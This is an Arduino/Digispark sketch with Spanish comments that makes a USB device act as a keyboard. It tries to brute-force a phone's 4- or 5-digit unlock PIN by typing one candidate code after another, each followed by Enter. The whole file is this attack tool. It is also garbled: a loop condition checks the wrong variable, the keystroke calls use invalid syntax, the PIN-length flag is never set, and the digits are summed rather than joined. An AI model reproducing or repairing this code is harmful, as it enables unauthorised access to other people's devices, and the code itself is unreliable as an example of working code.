#include "DigiKeyboard.h"
void setup() {
}

void loop() {
 DigiKeyboard.update();
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(2000);
 int count = 0; // iniciamos un contador para resetar variables si se pasan del numero 10
bool key_stroke_e = false;

//Generamos las variables para desbloequeo de celular en un ciclo for
 for(int a=0; a<=9; a++){
  for(int b=0; b<=9; b++){
    for(int c=0; b<=9; c++){
      for(int d=0; d<=9; d++){
        for(int e=0; e<=9; e++){
          for(int f=0; f<=9; f++){

// este condicional nos ayuda a saber si el pin del celular es de 4 o 5 digitos
               if (key_stroke_e == true){
                 DigiKeyboard.sendKeyStroke([a]);
                 DigiKeyboard.sendKeyStroke([b]);
                 DigiKeyboard.sendKeyStroke([c]);
                 DigiKeyboard.sendKeyStroke([d]);
                 DigiKeyboard.sendKeyStroke([e]);

 //Concatenamos las variables tipo string para que sean una cadena
            String(a);
            String(b);
            String(c);
            String(d);
            String(e);
            DigiKeyboard.println(a+b+c+d+e);
            DigiKeyboard.delay(250);
            DigiKeyboard.sendKeyStroke(40);
            DigiKeyboard.delay(500);
          }
        }
      }
    }
  }
 }
}
